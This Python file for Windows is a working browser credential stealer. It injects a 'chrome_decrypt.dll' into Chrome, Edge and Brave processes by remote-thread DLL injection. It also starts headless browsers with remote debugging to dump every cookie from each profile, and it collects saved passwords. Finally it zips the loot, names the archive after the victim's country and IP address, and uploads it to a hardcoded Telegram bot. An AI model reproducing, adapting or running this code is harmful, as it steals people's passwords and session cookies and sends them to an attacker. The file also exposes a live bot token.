# Define kernel32 and ntdll
import sys
import win32con
import ctypes
from ctypes import wintypes
from pathlib import Path
import json
import os
import time
import subprocess
import requests
import zipfile
import tempfile
from websocket import create_connection

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Define structures
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", ctypes.c_ushort),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD)
    ]

# Configure function signatures
for func, argtypes, restype in [
    (kernel32.CreateToolhelp32Snapshot, [wintypes.DWORD, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.Process32FirstW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.Process32NextW, [wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32W)], wintypes.BOOL),
    (kernel32.OpenProcess, [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD], wintypes.HANDLE),
    (kernel32.VirtualAllocEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD], ctypes.c_void_p),
    (kernel32.WriteProcessMemory, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)], wintypes.BOOL),
    (kernel32.GetProcAddress, [wintypes.HMODULE, ctypes.c_char_p], ctypes.c_void_p),
    (kernel32.CreateRemoteThread, [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)], wintypes.HANDLE),
    (kernel32.GetExitCodeThread, [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)], wintypes.BOOL),
    (kernel32.VirtualFreeEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD], wintypes.BOOL),
    (kernel32.WaitForSingleObject, [wintypes.HANDLE, wintypes.DWORD], wintypes.DWORD),
    (kernel32.CreateEventW, [ctypes.c_void_p, wintypes.BOOL, wintypes.BOOL, wintypes.LPCWSTR], wintypes.HANDLE),
    (kernel32.ResetEvent, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.GetModuleHandleW, [wintypes.LPCWSTR], wintypes.HMODULE),
    (kernel32.CloseHandle, [wintypes.HANDLE], wintypes.BOOL),
    (kernel32.VirtualQueryEx, [wintypes.HANDLE, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t], ctypes.c_size_t),
    (ntdll.NtCreateThreadEx, [ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD, ctypes.c_void_p, wintypes.HANDLE,
                              ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t,
                              ctypes.c_size_t, ctypes.c_void_p], ctypes.c_ulong)
]:
    func.argtypes = argtypes
    func.restype = restype

PROCESS_ACCESS = win32con.PROCESS_CREATE_THREAD | win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_OPERATION | win32con.PROCESS_VM_WRITE | win32con.PROCESS_VM_READ

BASE_DEBUG_PORT = 9222
bot_token = "7887423007:AAH4NmMXSycneZ-kwVFnC31ZKtyWm8r5VYo"
chat_id = "-1002685970945"
webhook_message = f'https://api.telegram.org/bot{bot_token}/sendMessage'
webhook_document = f'https://api.telegram.org/bot{bot_token}/sendDocument'
BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}
browser_paths = {}
user_data_dirs = {}

browsers = {
    "chrome": ("Google\\Chrome", "chrome.exe"),
    "vivaldi": ("Vivaldi", "vivaldi.exe"),
    "edge": ("Microsoft\\Edge", "msedge.exe"),
    "opera": ("Opera", "launcher.exe", "Opera Software\\Opera Stable"),
    "operagx": ("Opera GX", "launcher.exe", "Opera Software\\Opera GX Stable"),
    "brave": ("BraveSoftware\\Brave-Browser", "brave.exe"),
    "firefox": ("Mozilla Firefox", "firefox.exe", "Mozilla\\Firefox\\Profiles"),
    "yandex": ("Yandex\\YandexBrowser", "browser.exe"),
    "chromium": ("Chromium", "chromium.exe"),
    "safari": ("Apple Computer\\Safari", "safari.exe"),
    "maxthon": ("Maxthon\\Maxthon", "maxthon.exe"),
    "uc_browser": ("UCBrowser", "ucbrowser.exe"),
    "torch": ("Torch", "torch.exe"),
    "comodo_dragon": ("Comodo\\Dragon", "dragon.exe"),
    "slimjet": ("Slimjet", "slimjet.exe"),
    "pale_moon": ("Moonchild Productions\\Pale Moon", "palemoon.exe"),
    "waterfox": ("Waterfox", "waterfox.exe"),
    "seamonkey": ("Mozilla\\SeaMonkey", "seamonkey.exe"),
    "epic_privacy_browser": ("Epic Privacy Browser", "epic.exe"),
    "avant_browser": ("Avant Browser", "avant.exe"),
    "msie": ("Internet Explorer", "iexplore.exe"),
    "ie": ("Internet Explorer", "iexplore.exe"),
    "coccoc": ("CocCoc\\Browser", "browser.exe")
}

for browser, info in browsers.items():
    folder, exe = info[:2]
    browser_paths[browser] = [
        os.path.join("C:\\Program Files", folder, "Application", exe),
        os.path.join("C:\\Program Files (x86)", folder, "Application", exe),
        os.path.join(os.getenv("LOCALAPPDATA"), folder, "Application", exe)
    ]
    if len(info) == 3:
        user_data_dirs[browser] = os.path.join(os.getenv("APPDATA"), info[2])
    else:
        user_data_dirs[browser] = os.path.join(os.getenv("LOCALAPPDATA"), folder, "User Data")

# Define HandleGuard class
class HandleGuard:
    def __init__(self, handle):
        self._handle = handle if handle != -1 else None

    def __del__(self):
        if self._handle:
            kernel32.CloseHandle(self._handle)

    def get(self):
        return self._handle

class Maincookie:
    temp_dir = tempfile.mkdtemp()
    collected_files = []
    DEBUG_PORT = BASE_DEBUG_PORT
    DEBUG_URL = f"http://localhost:{DEBUG_PORT}/json"
    BROWSERS = {"chrome": "chrome.exe", "brave": "brave.exe", "edge": "msedge.exe"}

    def __init__(self, handle):
        self._handle = None if handle == -1 else handle

    def __del__(self):
        if self._handle:
            kernel32.CloseHandle(self._handle)

    def get(self):
        return self._handle

    @staticmethod
    def get_pid(proc_name):
        snap = HandleGuard(kernel32.CreateToolhelp32Snapshot(0x2, 0))
        if not snap.get():
            return None
        entry = PROCESSENTRY32W(dwSize=ctypes.sizeof(PROCESSENTRY32W))
        if not kernel32.Process32FirstW(snap.get(), ctypes.byref(entry)):
            return None
        while True:
            if entry.szExeFile.lower() == proc_name.lower():
                return entry.th32ProcessID
            if not kernel32.Process32NextW(snap.get(), ctypes.byref(entry)):
                break
        return None

    @staticmethod
    def get_dll_path():
        exe_path = Path(sys.executable if hasattr(sys, 'frozen') else __file__).parent
        dll_path = exe_path / "chrome_decrypt.dll"
        return str(dll_path) if dll_path.exists() else ""

    @staticmethod
    def inject_dll(proc, dll_path):
        dll_bytes = (dll_path + '\0').encode('ascii')
        size = len(dll_bytes)
        remote_mem = kernel32.VirtualAllocEx(proc, None, size, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_READWRITE)
        if not remote_mem:
            return False
        try:
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(proc, remote_mem, dll_bytes, size, ctypes.byref(written)) or written.value != size:
                return False
            mem_info = MEMORY_BASIC_INFORMATION()
            if not kernel32.VirtualQueryEx(proc, remote_mem, ctypes.byref(mem_info), ctypes.sizeof(mem_info)) or mem_info.Protect != win32con.PAGE_READWRITE:
                return False
            load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
            if not load_library:
                return False
            th = HandleGuard(kernel32.CreateRemoteThread(proc, None, 0, load_library, remote_mem, 0, None))
            if not th.get() or kernel32.WaitForSingleObject(th.get(), 15000) != win32con.WAIT_OBJECT_0:
                return False
            exit_code = wintypes.DWORD()
            return kernel32.GetExitCodeThread(th.get(), ctypes.byref(exit_code)) and exit_code.value not in (0, 0xC0000005)
        finally:
            kernel32.VirtualFreeEx(proc, remote_mem, 0, win32con.MEM_RELEASE)

    @staticmethod
    def find_browser_path(browser_name):
        paths = browser_paths.get(browser_name, [])
        for path in paths:
            if os.path.exists(path):
                return path
        return None

    @staticmethod
    def get_user_data_dir(browser_name):
        return user_data_dirs.get(browser_name, None)

    @staticmethod
    def get_profiles(user_data_dir):
        profiles = []
        if os.path.exists(user_data_dir):
            for item in os.listdir(user_data_dir):
                full_path = os.path.join(user_data_dir, item)
                if os.path.isdir(full_path) and (item.startswith("Profile") or item == "Default"):
                    profiles.append(item)
        return profiles

    @staticmethod
    def start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
        try:
            args = [
                browser_path,
                f"--remote-debugging-port={debug_port}",
                f"--user-data-dir={user_data_dir}",
                f"--profile-directory={profile}",
                f"--remote-allow-origins=http://localhost:{debug_port}",
                "--disable-gpu",
                "--disable-software-rasterizer",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--headless"
            ]
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            for _ in range(5):
                try:
                    requests.get(f"http://localhost:{debug_port}/json", timeout=2)
                    return True
                except requests.exceptions.RequestException:
                    time.sleep(2)
            return False
        except Exception as e:
            print(f"Error starting browser: {e}")
            return False

    @staticmethod
    def get_debug_ws_url(debug_port):
        max_retries = 5
        retry_delay = 1
        debug_url = f"http://localhost:{debug_port}/json"
        for attempt in range(max_retries):
            try:
                response = requests.get(debug_url, timeout=5)
                response.raise_for_status()
                data = response.json()
                if data and "webSocketDebuggerUrl" in data[0]:
                    return data[0]["webSocketDebuggerUrl"]
                time.sleep(retry_delay)
            except (requests.RequestException, IndexError, KeyError, json.JSONDecodeError) as e:
                if attempt == max_retries - 1:
                    print(f"Failed to get WebSocket URL on port {debug_port} after {max_retries} attempts: {str(e)}")
                    return None
                time.sleep(retry_delay)
        return None

    @staticmethod
    def json_to_netscape(json_cookies):
        cookies = json.loads(json_cookies)
        netscape_format = []
        for cookie in cookies:
            domain = cookie.get("host", "")
            name = cookie.get("name", "")
            value = cookie.get("value", "")
            http_only = "FALSE"
            path = "/"
            secure = "FALSE"
            expiry = 0
            netscape_format.append(
                f"{domain}\t{http_only}\t{path}\t{secure}\t{expiry}\t{name}\t{value}"
            )
        return "\n".join(netscape_format)

    @staticmethod
    def json_to_password_format(json_passwords, browser_name):
        passwords = json.loads(json_passwords)
        formatted_passwords = []
        for login in passwords:
            url = login.get("origin", "")
            username = login.get("username", "")
            password = login.get("password", "Error")
            formatted_passwords.append(
                f"URL: {url}\nUsername: {username}\nPassword: {password}\nBrowser: {browser_name}\n======================================================================\n"
            )
        return "".join(formatted_passwords)

    @staticmethod
    def save_cookies_to_file(filename, cookies):
        filepath = os.path.join(Maincookie.temp_dir, filename)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(cookies)
        if filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)

    @staticmethod
    def save_passwords_to_file(filename, passwords):
        filepath = os.path.join(Maincookie.temp_dir, filename)
        with open(filepath, "w", encoding="utf-8") as file:
            file.write(passwords)
        if filepath not in Maincookie.collected_files:
            Maincookie.collected_files.append(filepath)

    @staticmethod
    def get_country_and_ip():
        try:
            response = requests.get("https://ipinfo.io", timeout=5)
            response.raise_for_status()
            data = response.json()
            country = data.get("country", "Unknown")
            ip = data.get("ip", "0.0.0.0")
            return country, ip
        except requests.RequestException:
            return "Unknown", "0.0.0.0"

    @staticmethod
    def process_browser(browser):
        browser_name = browser.lower()
        pid = Maincookie.get_pid(Maincookie.BROWSERS.get(browser_name))
        debug_port = Maincookie.DEBUG_PORT
        
        # If no process is running, start the browser in headless mode
        if not pid:
            print(f"No running process found for {browser}. Attempting to start in headless mode...")
            browser_path = Maincookie.find_browser_path(browser_name)
            if not browser_path:
                print(f"{browser} executable not found.")
                return
            user_data_dir = Maincookie.get_user_data_dir(browser_name)
            if not user_data_dir:
                print(f"User data directory for {browser} not found.")
                return
            profile = "Default"  # Use default profile for simplicity
            if not Maincookie.start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
                print(f"Failed to start {browser} in headless mode on port {debug_port}")
                Maincookie.DEBUG_PORT += 1  # Increment port to avoid conflicts
                return
            # Wait briefly to ensure the process is running
            time.sleep(2)
            # Get the new PID after starting the browser
            pid = Maincookie.get_pid(Maincookie.BROWSERS.get(browser_name))
            if not pid:
                print(f"Failed to get PID for {browser} after starting in headless mode")
                Maincookie.close_debug_port(debug_port)
                Maincookie.DEBUG_PORT += 1
                return
        
        # Proceed with existing logic to process the browser
        proc = HandleGuard(kernel32.OpenProcess(PROCESS_ACCESS, False, pid))
        if not proc.get():
            print(f"Failed to open process for {browser}")
            Maincookie.close_debug_port(debug_port)  # Cleanup if process was started
            Maincookie.DEBUG_PORT += 1
            return
        dll_path = Maincookie.get_dll_path()
        if not dll_path:
            print(f"chrome_decrypt.dll not found for {browser}")
            Maincookie.close_debug_port(debug_port)  # Cleanup
            Maincookie.DEBUG_PORT += 1
            return
        if not Maincookie.inject_dll(proc.get(), dll_path):
            print(f"Failed to inject DLL for {browser}")
            Maincookie.close_debug_port(debug_port)  # Cleanup
            Maincookie.DEBUG_PORT += 1
            return
        event = HandleGuard(kernel32.CreateEventW(None, True, False, "Global\\ChromeDecryptWorkDoneEvent"))
        if not event.get():
            print(f"Failed to create event for {browser}")
            Maincookie.close_debug_port(debug_port)  # Cleanup
            Maincookie.DEBUG_PORT += 1
            return
        kernel32.ResetEvent(event.get())
        kernel32.WaitForSingleObject(event.get(), 60000)
        temp_dir = Path(tempfile.gettempdir())
        browser_display_name = {"chrome": "Google Chrome", "edge": "Microsoft Edge", "brave": "Brave"}.get(browser_name, browser)
        
        # Process cookies
        src_cookies = temp_dir / f"{browser}_decrypt_cookies.txt"
        dst_cookies = temp_dir / f"cookies_{browser}_Default.txt"
        if src_cookies.exists():
            try:
                with open(src_cookies, "r", encoding="utf-8") as f:
                    json_cookies = f.read()
                netscape_cookies = Maincookie.json_to_netscape(json_cookies)
                if dst_cookies.exists():
                    dst_cookies.unlink()
                Maincookie.save_cookies_to_file(dst_cookies.name, netscape_cookies)
                print(f"Cookies file generated for {browser}: {dst_cookies}")
            except Exception as e:
                print(f"Error processing cookies file for {browser}: {e}")
        else:
            print(f"No cookies file generated for {browser}")
        
        # Process passwords
        src_passwords = temp_dir / f"{browser}_decrypt_passwords.txt"
        dst_passwords = temp_dir / f"passwords_{browser}_Default.txt"
        if src_passwords.exists():
            try:
                with open(src_passwords, "r", encoding="utf-8") as f:
                    json_passwords = f.read()
                formatted_passwords = Maincookie.json_to_password_format(json_passwords, browser_display_name)
                if dst_passwords.exists():
                    dst_passwords.unlink()
                Maincookie.save_passwords_to_file(dst_passwords.name, formatted_passwords)
                print(f"Passwords file generated for {browser}: {dst_passwords}")
            except Exception as e:
                print(f"Error processing passwords file for {browser}: {e}")
        else:
            print(f"No passwords file generated for {browser}")
        
        # Cleanup: Close the debug port if we started the browser
        Maincookie.close_debug_port(debug_port)
        Maincookie.DEBUG_PORT += 1

    @staticmethod
    def create_zip_file():
        country, ip = Maincookie.get_country_and_ip()
        zip_name = os.path.join(Maincookie.temp_dir, f"{country}_{ip}.zip")
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in Maincookie.collected_files:
                if os.path.exists(file):
                    base_name = os.path.basename(file)
                    zipf.write(file, base_name)
        return zip_name

    @staticmethod
    def send_zip_to_telegram(zip_name):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        try:
            with open(zip_name, "rb") as file:
                response = requests.post(url, data={"chat_id": chat_id}, files={"document": file})
                if response.status_code == 200:
                    print(f"ZIP file {zip_name} sent successfully to Telegram group {chat_id}")
                else:
                    print(f"Failed to send ZIP file {zip_name} to group {chat_id}")
        except Exception as e:
            print(f"Error sending ZIP file {zip_name} to {chat_id}: {e}")

    @staticmethod
    def close_debug_port(debug_port):
        try:
            output = subprocess.check_output(
                f"netstat -ano | findstr :{debug_port}",
                shell=True,
                stderr=subprocess.DEVNULL,
                text=True
            )
            if output:
                for line in output.strip().splitlines():
                    pid = line.strip().split()[-1]
                    if pid != "0":
                        subprocess.run(
                            ["taskkill", "/F", "/PID", pid],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        print(f"Closed process (PID: {pid}) using debug port {debug_port}")
        except subprocess.CalledProcessError:
            print(f"No process found using debug port {debug_port}")
        except Exception as e:
            print(f"Error closing debug port {debug_port}: {e}")

    @staticmethod
    def extract_cookies_for_browser(browser_name):
        browser_path = Maincookie.find_browser_path(browser_name)
        if not browser_path:
            print(f"{browser_name} not found.")
            return
        user_data_dir = Maincookie.get_user_data_dir(browser_name)
        if not user_data_dir:
            print(f"User data directory for {browser_name} not found.")
            return
        profiles = Maincookie.get_profiles(user_data_dir)
        if not profiles:
            print(f"No profiles found for {browser_name}.")
            return
        debug_port = Maincookie.DEBUG_PORT
        for profile in profiles:
            try:
                print(f"Processing profile: {profile} on port {debug_port}")
                if not Maincookie.start_debugged_browser(browser_path, user_data_dir, profile, debug_port):
                    print(f"Failed to start {browser_name} in debug mode on port {debug_port}")
                    debug_port += 1
                    continue
                ws_url = Maincookie.get_debug_ws_url(debug_port)
                if not ws_url:
                    print(f"Could not get WebSocket URL for {browser_name} {profile} on port {debug_port}")
                    debug_port += 1
                    continue
                ws = create_connection(ws_url, timeout=10)
                ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
                response = ws.recv()
                ws.close()
                response_data = json.loads(response)
                cookies = response_data.get("result", {}).get("cookies", [])
                if cookies:
                    formatted_cookies = [
                        {
                            "host": cookie.get("domain", ""),
                            "name": cookie.get("name", ""),
                            "value": cookie.get("value", "")
                        } for cookie in cookies
                    ]
                    cookie_data = json.dumps(formatted_cookies, indent=2)
                    netscape_cookies = Maincookie.json_to_netscape(cookie_data)
                    filename = f"cookies_{browser_name}_{profile}.txt"
                    Maincookie.save_cookies_to_file(filename, netscape_cookies)
                    print(f"Successfully exported {len(cookies)} cookies from {browser_name} {profile}")
            except Exception as e:
                print(f"Error extracting cookies from {browser_name} {profile} on port {debug_port}: {e}")
            finally:
                Maincookie.close_debug_port(debug_port)
                debug_port += 1
                time.sleep(2)

    @staticmethod
    def execute():
        temp_dir = Path(tempfile.gettempdir())
        for file in ["chrome_decrypt.log", "chrome_appbound_key.txt"]:
            try:
                (temp_dir / file).unlink()
            except:
                pass
        for browser in Maincookie.BROWSERS:
            print(f"\nProcessing {browser}...")
            Maincookie.process_browser(browser)
        for browser_name in browser_paths.keys():
            if browser_name.lower() in Maincookie.BROWSERS:
                continue
            print(f"\nExtracting cookies from {browser_name}...")
            Maincookie.extract_cookies_for_browser(browser_name)
        if Maincookie.collected_files:
            print("\nCreating ZIP file for collected cookies and passwords...")
            zip_name = Maincookie.create_zip_file()
            print(f"ZIP file created: {zip_name}")
            print("\nSending ZIP file to Telegram...")
            Maincookie.send_zip_to_telegram(zip_name)

if __name__ == '__main__':
    if os.name == "nt":
        Maincookie.execute()